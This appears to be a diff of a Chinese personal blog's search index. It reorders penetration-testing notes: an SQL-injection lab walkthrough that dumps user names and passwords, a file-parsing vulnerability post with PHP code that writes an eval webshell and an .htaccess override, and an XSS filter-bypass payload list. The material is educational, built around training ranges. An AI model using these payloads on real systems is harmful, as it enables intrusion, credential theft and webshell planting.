-<li>因特网具有一些特殊的<strong>路由选择协议</strong>（routing protocol），用于自动地设置这些转发表</li>
-</ul>
-<h2 id="二、电路交换"><a href="#二、电路交换" class="headerlink" title="二、电路交换"></a>二、电路交换</h2><ul>
-<li><p>在电路交换网络中，端系统间通信会话期间，预留了端系统间沿路径通信所需要的资源（缓存，链路传输速率）。而在分组交换网络中，这些资源则不是预留的</p>
-</li>
-<li><p>当两台主机要通信时，该网络在两台主机之间创建一条专用的<strong>端到端连接</strong>（end-to-end connection）</p>
-</li>
-<li><p>如图1-13，这条专用的端到端连接使用第一条链路中的第二条电路喝第二条链路中的第四条电路</p>
-<p><img src="/2022/01/22/read-1-3/1.png" alt></p>
-</li>
-<li><p>因为每条链路具有4条电路，对于由端到端连接所使用的每条链路而言，该连接在连接期间获得链路总传输总量的$\frac{1}{4}$。例如，如果两台邻近交换机之间每条链路具有1Mbps传输速率，则每个端到端电路交换连接获得250kbps专用的传输速率</p>
-</li>
-</ul>
-<h2 id="三、网络的网络"><a href="#三、网络的网络" class="headerlink" title="三、网络的网络"></a>三、网络的网络</h2>]]></content>
-      <categories>
-        <category>读书笔记</category>
-      </categories>
-      <tags>
-        <tag>learn</tag>
-        <tag>read</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>《计算机网络自顶向下方法》（计算机网络和因特网）（1）</title>
     <url>/2022/01/11/read-1.1/</url>
     <content><![CDATA[<h1 id="0x01-什么是因特网？"><a href="#0x01-什么是因特网？" class="headerlink" title="0x01 什么是因特网？"></a>0x01 什么是因特网？</h1><h2 id="1-1-具体构成描述"><a href="#1-1-具体构成描述" class="headerlink" title="1.1 具体构成描述"></a>1.1 具体构成描述</h2><p>因特网是一个世界范围    的计算机网络，即它是一个互联了遍及全世界数十亿计算设备的网络。</p>
@@ -2235,6 +2235,59 @@
       </categories>
       <tags>
         <tag>read</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL简单手工注入</title>
+    <url>/2022/01/08/sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p>题目是墨者里的一道入门题</p>
+<p><img src="/2022/01/08/sql%E6%B3%A8%E5%85%A5/1.png" alt></p>
+<p>访问靶场，找到有注入点的地方</p>
+<p><img src="/2022/01/08/sql%E6%B3%A8%E5%85%A5/2.png" alt></p>
+<h2 id="一、测试是否有注入漏洞"><a href="#一、测试是否有注入漏洞" class="headerlink" title="一、测试是否有注入漏洞"></a>一、测试是否有注入漏洞</h2><p>在需要传递参数的地方进行测试</p>
+<p><img src="/2022/01/08/sql%E6%B3%A8%E5%85%A5/3.png" alt></p>
+<p>发现页面显示有错，则存在注入漏洞：</p>
+<ol>
+<li>猜解列名数量(字段数)，使用<strong>order by</strong>来进行猜解</li>
+<li>报错猜解准备 例如：<strong>?id=-1 union select 1,2,3,4</strong></li>
+</ol>
+<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><ol>
+<li>版本：<strong>version()</strong></li>
+<li>数据库名字：<strong>database()</strong></li>
+<li>用户名：<strong>user()</strong></li>
+<li>操作系统：<strong>@@version_compile_os</strong></li>
+<li>…</li>
+</ol>
+<p>因此能找出以下信息:</p>
+<ol>
+<li>版本：<strong>5.7.22-0ubuntu0.16.04.1</strong></li>
+<li>数据库名字：<strong>mozhe_Discuz_StormGroup</strong></li>
+<li>用户名：<strong>root@localhost</strong></li>
+<li>操作系统：<strong>Linux</strong></li>
+</ol>
+<h2 id="三、数据注入"><a href="#三、数据注入" class="headerlink" title="三、数据注入"></a>三、数据注入</h2><ul>
+<li>在MySQL5.0以上的版本中，MySQL存在一个自带数据库名为<strong>information_schema</strong>，它是一个存储记录有所有数据库名，表名和列名的数据库，也相当于可以通过它获取指定数据库下面的表名或列名信息</li>
+<li>数据库中用符号”<strong>.</strong>“代表下一级</li>
+<li><strong>information_schema.tables</strong>：记录所有表名的表</li>
+<li><strong>information_schema.columns</strong>：记录所有列名的表</li>
+</ul>
+<p>一、通过sql语句将数据库下的所有表名显示出来：</p>
+<p><strong>?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=’mozhe_Discuz_StormGroup’</strong></p>
+<p>如图：</p>
+<p><img src="/2022/01/08/sql%E6%B3%A8%E5%85%A5/4.png" alt></p>
+<p>二、再通过这个表名将下面的所有列名显示出来：<br><strong>?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=’StormGroup_member’</strong><br>如图：</p>
+<p><img src="/2022/01/08/sql%E6%B3%A8%E5%85%A5/5.png" alt></p>
+<p>三、只需要将<strong>name</strong>和<strong>password</strong>显示出来：<br><strong>?id=-1 union select 1,name,password,4 from StormGroup_member limit x,1</strong><br>因为可能存在多解情况，因此要逐个试一遍，让x=0，1，2…</p>
+<p>最后的结果是：<br><strong>?id=-1 union select 1,name,password,4 from StormGroup_member limit 1,1</strong></p>
+<p><img src="/2022/01/08/sql%E6%B3%A8%E5%85%A5/6.png" alt></p>
+<p>将密码用md5解密，登录成功后即可获得key</p>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -2389,59 +2442,6 @@
 </ol>
 <h2 id="六、DNS注入"><a href="#六、DNS注入" class="headerlink" title="六、DNS注入"></a>六、DNS注入</h2><p>DNSlog主要解决盲注不能回显数据、效率低的问题</p>
 <p>适合的网站：<a href="http://ceye.io">http://ceye.io</a></p>
-]]></content>
-      <categories>
-        <category>搞渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MySQL简单手工注入</title>
-    <url>/2022/01/08/sql%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<p>题目是墨者里的一道入门题</p>
-<p><img src="/2022/01/08/sql%E6%B3%A8%E5%85%A5/1.png" alt></p>
-<p>访问靶场，找到有注入点的地方</p>
-<p><img src="/2022/01/08/sql%E6%B3%A8%E5%85%A5/2.png" alt></p>
-<h2 id="一、测试是否有注入漏洞"><a href="#一、测试是否有注入漏洞" class="headerlink" title="一、测试是否有注入漏洞"></a>一、测试是否有注入漏洞</h2><p>在需要传递参数的地方进行测试</p>
-<p><img src="/2022/01/08/sql%E6%B3%A8%E5%85%A5/3.png" alt></p>
-<p>发现页面显示有错，则存在注入漏洞：</p>
-<ol>
-<li>猜解列名数量(字段数)，使用<strong>order by</strong>来进行猜解</li>
-<li>报错猜解准备 例如：<strong>?id=-1 union select 1,2,3,4</strong></li>
-</ol>
-<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><ol>
-<li>版本：<strong>version()</strong></li>
-<li>数据库名字：<strong>database()</strong></li>
-<li>用户名：<strong>user()</strong></li>
-<li>操作系统：<strong>@@version_compile_os</strong></li>
-<li>…</li>
-</ol>
-<p>因此能找出以下信息:</p>
-<ol>
-<li>版本：<strong>5.7.22-0ubuntu0.16.04.1</strong></li>
-<li>数据库名字：<strong>mozhe_Discuz_StormGroup</strong></li>
-<li>用户名：<strong>root@localhost</strong></li>
-<li>操作系统：<strong>Linux</strong></li>
-</ol>
-<h2 id="三、数据注入"><a href="#三、数据注入" class="headerlink" title="三、数据注入"></a>三、数据注入</h2><ul>
-<li>在MySQL5.0以上的版本中，MySQL存在一个自带数据库名为<strong>information_schema</strong>，它是一个存储记录有所有数据库名，表名和列名的数据库，也相当于可以通过它获取指定数据库下面的表名或列名信息</li>
-<li>数据库中用符号”<strong>.</strong>“代表下一级</li>
-<li><strong>information_schema.tables</strong>：记录所有表名的表</li>
-<li><strong>information_schema.columns</strong>：记录所有列名的表</li>
-</ul>
-<p>一、通过sql语句将数据库下的所有表名显示出来：</p>
-<p><strong>?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=’mozhe_Discuz_StormGroup’</strong></p>
-<p>如图：</p>
-<p><img src="/2022/01/08/sql%E6%B3%A8%E5%85%A5/4.png" alt></p>
-<p>二、再通过这个表名将下面的所有列名显示出来：<br><strong>?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=’StormGroup_member’</strong><br>如图：</p>
-<p><img src="/2022/01/08/sql%E6%B3%A8%E5%85%A5/5.png" alt></p>
-<p>三、只需要将<strong>name</strong>和<strong>password</strong>显示出来：<br><strong>?id=-1 union select 1,name,password,4 from StormGroup_member limit x,1</strong><br>因为可能存在多解情况，因此要逐个试一遍，让x=0，1，2…</p>
-<p>最后的结果是：<br><strong>?id=-1 union select 1,name,password,4 from StormGroup_member limit 1,1</strong></p>
-<p><img src="/2022/01/08/sql%E6%B3%A8%E5%85%A5/6.png" alt></p>
-<p>将密码用md5解密，登录成功后即可获得key</p>
 ]]></content>
       <categories>
         <category>搞渗透</category>
@@ -2795,104 +2795,6 @@
       </tags>
   </entry>
   <entry>
-    <title>解析漏洞</title>
-    <url>/2022/01/09/upload/</url>
-    <content><![CDATA[<h1 id="0x01-IIS5-x-6-0解析漏洞"><a href="#0x01-IIS5-x-6-0解析漏洞" class="headerlink" title="0x01 IIS5.x/6.0解析漏洞"></a>0x01 IIS5.x/6.0解析漏洞</h1><p>IIS6.0解析利用的方法有两种：</p>
-<ol>
-<li><p><strong>目录解析</strong></p>
-<p>在网站下建立文件夹名字为.<strong>asp</strong>、.<strong>asa</strong>的文件夹，其目录内的任何扩展名的文件都别IIS当作asp文件来解析并执行。例如创建目录<strong>pamela.asp</strong>，那么<strong>pamela.asp / 1.jpg</strong>将被当作asp文件来执行。</p>
-</li>
-<li><p><strong>文件解析</strong></p>
-<p>在IIS6.0下，分号后面的不被解析，也就是说pamela.asp;.jpg会被服务器看成是pamela.asp，还有        IIS6.0默认的可执行文件除了asp还包括这三种:</p>
-</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pamela.asa</span><br><span class="line">pamela.cer</span><br><span class="line">pamela.cdx</span><br></pre></td></tr></table></figure>
-<h1 id="0x02-IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#0x02-IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="0x02 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞"></a>0x02 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞</h1><p>在默认Fast-CGI开启状况下，上传一个名字为<strong>pamela.jpg</strong>，内容为</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line">fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval(&amp;_POST[cmd])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>的文件，然后访问<strong>pamela.jpg/.php</strong>，在这个目录下就会生成一句话木马<strong>shell.php</strong></p>
-<h1 id="0x03-Nginx-lt-8-03空字节代码执行漏洞"><a href="#0x03-Nginx-lt-8-03空字节代码执行漏洞" class="headerlink" title="0x03 Nginx&lt;8.03空字节代码执行漏洞"></a>0x03 Nginx&lt;8.03空字节代码执行漏洞</h1><ol>
-<li><p><strong>影响版本</strong>:</p>
-<p>0.5./0.6./0.7&lt;=0.7.65/0.8&lt;=0.8.37</p>
-</li>
-<li><p><strong>简介</strong></p>
-<p>Nginx在图片中嵌入php代码然后通过访问</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx.jpg%00.php</span><br></pre></td></tr></table></figure>
-<p>来执行其中的代码</p>
-</li>
-</ol>
-<h1 id="0x04-Apache解析漏洞"><a href="#0x04-Apache解析漏洞" class="headerlink" title="0x04 Apache解析漏洞"></a>0x04 Apache解析漏洞</h1><ol>
-<li><p><strong>背景</strong></p>
-<p>Apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断。</p>
-</li>
-<li><p><strong>简介</strong></p>
-<p>比如<strong>pamela.php.owf.rar</strong> “<strong>.owf</strong>”和”<strong>.rar</strong>” 这两种后缀是 apache 不可识别解析,apache就会把<strong>pamela.php.owf.rar</strong>解析成 <strong>.php</strong></p>
-</li>
-<li><p><strong>利用</strong></p>
-<p>如何判断是不是合法的后缀就是这个漏洞的利用关键,<strong>pamela.php.rara.jpg.png…</strong>（把你知道的常见后缀都写上）去测试是否是合法后缀</p>
-</li>
-</ol>
-<h1 id="0x05-其他"><a href="#0x05-其他" class="headerlink" title="0x05 其他"></a>0x05 其他</h1><ol>
-<li><p>在Windows环境下，<strong>xx.jpg[空格]或xx.jpg</strong> 这两类文件是不允许存在的，若这样命名，Windows会默认去除空格和点，我们可以通过抓包，在文件名后加一个<strong>空格或者点</strong>来绕过黑名单，若上传成功，空格和点都会被Windows自动消除，这样也可以getshell</p>
-</li>
-<li><p>如果在apache中 <strong>.htaccess</strong>可被执行，且可被上传，那可以尝试在 .htaccess中写入：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">cimer</span>&quot;&gt;</span> </span><br><span class="line">SetHandler application/x-httpd-php </span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>然后再上传shell.jpg的木马，这样shell.jpg就可解析为php文件</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>搞渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XSS各种绕过姿势</title>
-    <url>/2022/03/19/xss/</url>
-    <content><![CDATA[<h1 id="0x01-分类"><a href="#0x01-分类" class="headerlink" title="0x01 分类"></a>0x01 分类</h1><h2 id="1、反射型"><a href="#1、反射型" class="headerlink" title="1、反射型"></a>1、反射型</h2><p>也分为GET和POST两种，非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。</p>
-<h2 id="2、存储型"><a href="#2、存储型" class="headerlink" title="2、存储型"></a>2、存储型</h2><p>持久化，代码是存储在服务器中的，如在个人信息、发表文章、发表评论等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。</p>
-<h2 id="3、DOM型"><a href="#3、DOM型" class="headerlink" title="3、DOM型"></a>3、DOM型</h2><p>不经过后端，基于文档对象模型的一种漏洞，它是通过url传入参数去控制触发的，其实也属于反射型。</p>
-<h1 id="0x02-绕过方法"><a href="#0x02-绕过方法" class="headerlink" title="0x02 绕过方法"></a>0x02 绕过方法</h1><h2 id="一、过滤关键字"><a href="#一、过滤关键字" class="headerlink" title="一、过滤关键字"></a>一、过滤关键字</h2><h3 id="1-1-大小写绕过"><a href="#1-1-大小写绕过" class="headerlink" title="1.1 大小写绕过"></a>1.1 大小写绕过</h3><p><code>&lt;a Href=&quot;JavasCript:aLert(&#39;xss&#39;)&quot;&gt;</code></p>
-<h3 id="1-2-双写关键字绕过"><a href="#1-2-双写关键字绕过" class="headerlink" title="1.2 双写关键字绕过"></a>1.2 双写关键字绕过</h3><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过：</p>
-<p><code>&lt;a hhrefref=&quot;javascripscriptt:alert(&#39;xss&#39;)&quot;&gt;</code></p>
-<h3 id="1-3-字符串拼接"><a href="#1-3-字符串拼接" class="headerlink" title="1.3 字符串拼接"></a>1.3 字符串拼接</h3><ol>
-<li><p>通过利用eval函数：</p>
-<p><code>&lt;a href=&quot;a=&#39;javascri&#39;;b=&#39;pt:aler&#39;;c=&#39;t&#39;;d=&#39;(&#39;xss&#39;)&#39;;eval(a+b+c+d)&quot;&gt;</code></p>
-</li>
-<li><p>通过利用top函数：</p>
-<p><code>&lt;script&gt;top[&quot;ale&quot;+&quot;rt&quot;](&#39;xss&#39;)&lt;/script&gt;</code></p>
-</li>
-</ol>
-<h3 id="1-4-使用注释进行干扰绕过"><a href="#1-4-使用注释进行干扰绕过" class="headerlink" title="1.4 使用注释进行干扰绕过"></a>1.4 使用注释进行干扰绕过</h3><p><code>&lt;scri&lt;!--aaa--&gt;pt&gt;alert(123)&lt;/scri&lt;!--bbb--&gt;pt&gt;</code></p>
-<h3 id="1-5-编码绕过"><a href="#1-5-编码绕过" class="headerlink" title="1.5 编码绕过"></a>1.5 编码绕过</h3><ol>
-<li><p>Unicode编码绕过</p>
-<p><code>&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;&quot;&gt;</code></p>
-<p><code>&lt;a href=&quot;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0078\u0073\u0073\u0027\u0029&quot;&gt;</code></p>
-</li>
-<li><p>url编码绕过</p>
-<p><code>&lt;a href=&quot;%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%27%78%73%73%27%29&quot;&gt;</code></p>
-</li>
-<li><p>Ascii码绕过</p>
-<p><code>&lt;a href=&quot;&quot;&gt;</code></p>
-</li>
-</ol>
-<h2 id="三、HttpOnly"><a href="#三、HttpOnly" class="headerlink" title="三、HttpOnly"></a>三、HttpOnly</h2><p>HttpOnly是Set-Cookie HTTP响应头中包含的<em>附加标志</em>，开启后如果检测到检测到包含HttpOnly标志的cookie，并且客户端脚本代码尝试读取cookie，则浏览器会返回一个空字符作为结果。这样可以防止恶意（通常是XSS）代码将数据发送到攻击者的网站，从而导致攻击失败。</p>
-<h3 id="3-1、绕过方法"><a href="#3-1、绕过方法" class="headerlink" title="3.1、绕过方法"></a>3.1、绕过方法</h3><ol>
-<li>浏览器未保存账号密码，需要xss产生登录地址，利用表单劫持</li>
-<li>浏览器保存密码，产生在后台的xss，存储型xss如留言等，浏览器读取账号密码</li>
-</ol>
-]]></content>
-      <categories>
-        <category>搞渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>xss</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>upload-labs</title>
     <url>/2022/01/27/upload-labs/</url>
     <content><![CDATA[<h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01:"></a>Pass-01:</h1><p>查看源代码，不难发现，第一个属于前端<code>js</code>验证，有三种方法</p>
@@ -2966,6 +2868,104 @@
 ]]></content>
       <categories>
         <category>靶场&amp;靶机</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XSS各种绕过姿势</title>
+    <url>/2022/03/19/xss/</url>
+    <content><![CDATA[<h1 id="0x01-分类"><a href="#0x01-分类" class="headerlink" title="0x01 分类"></a>0x01 分类</h1><h2 id="1、反射型"><a href="#1、反射型" class="headerlink" title="1、反射型"></a>1、反射型</h2><p>也分为GET和POST两种，非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。</p>
+<h2 id="2、存储型"><a href="#2、存储型" class="headerlink" title="2、存储型"></a>2、存储型</h2><p>持久化，代码是存储在服务器中的，如在个人信息、发表文章、发表评论等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。</p>
+<h2 id="3、DOM型"><a href="#3、DOM型" class="headerlink" title="3、DOM型"></a>3、DOM型</h2><p>不经过后端，基于文档对象模型的一种漏洞，它是通过url传入参数去控制触发的，其实也属于反射型。</p>
+<h1 id="0x02-绕过方法"><a href="#0x02-绕过方法" class="headerlink" title="0x02 绕过方法"></a>0x02 绕过方法</h1><h2 id="一、过滤关键字"><a href="#一、过滤关键字" class="headerlink" title="一、过滤关键字"></a>一、过滤关键字</h2><h3 id="1-1-大小写绕过"><a href="#1-1-大小写绕过" class="headerlink" title="1.1 大小写绕过"></a>1.1 大小写绕过</h3><p><code>&lt;a Href=&quot;JavasCript:aLert(&#39;xss&#39;)&quot;&gt;</code></p>
+<h3 id="1-2-双写关键字绕过"><a href="#1-2-双写关键字绕过" class="headerlink" title="1.2 双写关键字绕过"></a>1.2 双写关键字绕过</h3><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过：</p>
+<p><code>&lt;a hhrefref=&quot;javascripscriptt:alert(&#39;xss&#39;)&quot;&gt;</code></p>
+<h3 id="1-3-字符串拼接"><a href="#1-3-字符串拼接" class="headerlink" title="1.3 字符串拼接"></a>1.3 字符串拼接</h3><ol>
+<li><p>通过利用eval函数：</p>
+<p><code>&lt;a href=&quot;a=&#39;javascri&#39;;b=&#39;pt:aler&#39;;c=&#39;t&#39;;d=&#39;(&#39;xss&#39;)&#39;;eval(a+b+c+d)&quot;&gt;</code></p>
+</li>
+<li><p>通过利用top函数：</p>
+<p><code>&lt;script&gt;top[&quot;ale&quot;+&quot;rt&quot;](&#39;xss&#39;)&lt;/script&gt;</code></p>
+</li>
+</ol>
+<h3 id="1-4-使用注释进行干扰绕过"><a href="#1-4-使用注释进行干扰绕过" class="headerlink" title="1.4 使用注释进行干扰绕过"></a>1.4 使用注释进行干扰绕过</h3><p><code>&lt;scri&lt;!--aaa--&gt;pt&gt;alert(123)&lt;/scri&lt;!--bbb--&gt;pt&gt;</code></p>
+<h3 id="1-5-编码绕过"><a href="#1-5-编码绕过" class="headerlink" title="1.5 编码绕过"></a>1.5 编码绕过</h3><ol>
+<li><p>Unicode编码绕过</p>
+<p><code>&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;&quot;&gt;</code></p>
+<p><code>&lt;a href=&quot;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0078\u0073\u0073\u0027\u0029&quot;&gt;</code></p>
+</li>
+<li><p>url编码绕过</p>
+<p><code>&lt;a href=&quot;%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%27%78%73%73%27%29&quot;&gt;</code></p>
+</li>
+<li><p>Ascii码绕过</p>
+<p><code>&lt;a href=&quot;&quot;&gt;</code></p>
+</li>
+</ol>
+<h2 id="三、HttpOnly"><a href="#三、HttpOnly" class="headerlink" title="三、HttpOnly"></a>三、HttpOnly</h2><p>HttpOnly是Set-Cookie HTTP响应头中包含的<em>附加标志</em>，开启后如果检测到检测到包含HttpOnly标志的cookie，并且客户端脚本代码尝试读取cookie，则浏览器会返回一个空字符作为结果。这样可以防止恶意（通常是XSS）代码将数据发送到攻击者的网站，从而导致攻击失败。</p>
+<h3 id="3-1、绕过方法"><a href="#3-1、绕过方法" class="headerlink" title="3.1、绕过方法"></a>3.1、绕过方法</h3><ol>
+<li>浏览器未保存账号密码，需要xss产生登录地址，利用表单劫持</li>
+<li>浏览器保存密码，产生在后台的xss，存储型xss如留言等，浏览器读取账号密码</li>
+</ol>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>xss</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>解析漏洞</title>
+    <url>/2022/01/09/upload/</url>
+    <content><![CDATA[<h1 id="0x01-IIS5-x-6-0解析漏洞"><a href="#0x01-IIS5-x-6-0解析漏洞" class="headerlink" title="0x01 IIS5.x/6.0解析漏洞"></a>0x01 IIS5.x/6.0解析漏洞</h1><p>IIS6.0解析利用的方法有两种：</p>
+<ol>
+<li><p><strong>目录解析</strong></p>
+<p>在网站下建立文件夹名字为.<strong>asp</strong>、.<strong>asa</strong>的文件夹，其目录内的任何扩展名的文件都别IIS当作asp文件来解析并执行。例如创建目录<strong>pamela.asp</strong>，那么<strong>pamela.asp / 1.jpg</strong>将被当作asp文件来执行。</p>
+</li>
+<li><p><strong>文件解析</strong></p>
+<p>在IIS6.0下，分号后面的不被解析，也就是说pamela.asp;.jpg会被服务器看成是pamela.asp，还有        IIS6.0默认的可执行文件除了asp还包括这三种:</p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pamela.asa</span><br><span class="line">pamela.cer</span><br><span class="line">pamela.cdx</span><br></pre></td></tr></table></figure>
+<h1 id="0x02-IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#0x02-IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="0x02 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞"></a>0x02 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞</h1><p>在默认Fast-CGI开启状况下，上传一个名字为<strong>pamela.jpg</strong>，内容为</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line">fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval(&amp;_POST[cmd])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>的文件，然后访问<strong>pamela.jpg/.php</strong>，在这个目录下就会生成一句话木马<strong>shell.php</strong></p>
+<h1 id="0x03-Nginx-lt-8-03空字节代码执行漏洞"><a href="#0x03-Nginx-lt-8-03空字节代码执行漏洞" class="headerlink" title="0x03 Nginx&lt;8.03空字节代码执行漏洞"></a>0x03 Nginx&lt;8.03空字节代码执行漏洞</h1><ol>
+<li><p><strong>影响版本</strong>:</p>
+<p>0.5./0.6./0.7&lt;=0.7.65/0.8&lt;=0.8.37</p>
+</li>
+<li><p><strong>简介</strong></p>
+<p>Nginx在图片中嵌入php代码然后通过访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx.jpg%00.php</span><br></pre></td></tr></table></figure>
+<p>来执行其中的代码</p>
+</li>
+</ol>
+<h1 id="0x04-Apache解析漏洞"><a href="#0x04-Apache解析漏洞" class="headerlink" title="0x04 Apache解析漏洞"></a>0x04 Apache解析漏洞</h1><ol>
+<li><p><strong>背景</strong></p>
+<p>Apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断。</p>
+</li>
+<li><p><strong>简介</strong></p>
+<p>比如<strong>pamela.php.owf.rar</strong> “<strong>.owf</strong>”和”<strong>.rar</strong>” 这两种后缀是 apache 不可识别解析,apache就会把<strong>pamela.php.owf.rar</strong>解析成 <strong>.php</strong></p>
+</li>
+<li><p><strong>利用</strong></p>
+<p>如何判断是不是合法的后缀就是这个漏洞的利用关键,<strong>pamela.php.rara.jpg.png…</strong>（把你知道的常见后缀都写上）去测试是否是合法后缀</p>
+</li>
+</ol>
+<h1 id="0x05-其他"><a href="#0x05-其他" class="headerlink" title="0x05 其他"></a>0x05 其他</h1><ol>
+<li><p>在Windows环境下，<strong>xx.jpg[空格]或xx.jpg</strong> 这两类文件是不允许存在的，若这样命名，Windows会默认去除空格和点，我们可以通过抓包，在文件名后加一个<strong>空格或者点</strong>来绕过黑名单，若上传成功，空格和点都会被Windows自动消除，这样也可以getshell</p>
+</li>
+<li><p>如果在apache中 <strong>.htaccess</strong>可被执行，且可被上传，那可以尝试在 .htaccess中写入：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">cimer</span>&quot;&gt;</span> </span><br><span class="line">SetHandler application/x-httpd-php </span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后再上传shell.jpg的木马，这样shell.jpg就可解析为php文件</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
       </categories>
       <tags>
         <tag>web</tag>
